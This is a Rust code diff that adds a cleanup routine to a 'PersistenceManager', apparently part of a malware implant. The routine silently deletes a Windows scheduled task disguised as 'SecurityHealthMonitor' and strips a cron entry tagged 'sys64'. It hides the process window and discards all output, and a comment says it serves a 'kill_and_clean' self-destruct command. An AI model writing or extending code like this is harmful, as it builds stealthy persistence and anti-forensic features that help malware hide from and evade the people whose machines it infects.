@@ -3,6 +3,30 @@
 pub struct PersistenceManager;
 
 impl PersistenceManager {
+    /// Remove persistence artifacts installed by `apply` (scheduled task / cron).
+    /// Used by the `kill_and_clean` self-destruct command.
+    pub fn cleanup() {
+        #[cfg(target_os = "windows")]
+        {
+            use std::os::windows::process::CommandExt;
+            let _ = std::process::Command::new("schtasks.exe")
+                .args(["/delete", "/tn", "SecurityHealthMonitor", "/f"])
+                .creation_flags(0x08000000)
+                .stdout(std::process::Stdio::null())
+                .stderr(std::process::Stdio::null())
+                .status();
+        }
+        #[cfg(not(target_os = "windows"))]
+        {
+            let cmd = "crontab -l 2>/dev/null | grep -v 'sys64' | crontab - 2>/dev/null";
+            let _ = std::process::Command::new("/bin/sh")
+                .args(["-c", cmd])
+                .stdout(std::process::Stdio::null())
+                .stderr(std::process::Stdio::null())
+                .status();
+        }
+    }
+
     pub fn apply(require_admin: bool, copy_to_path: Option<&str>, enable_persistence: bool) {
         if require_admin {
             Self::ensure_admin();
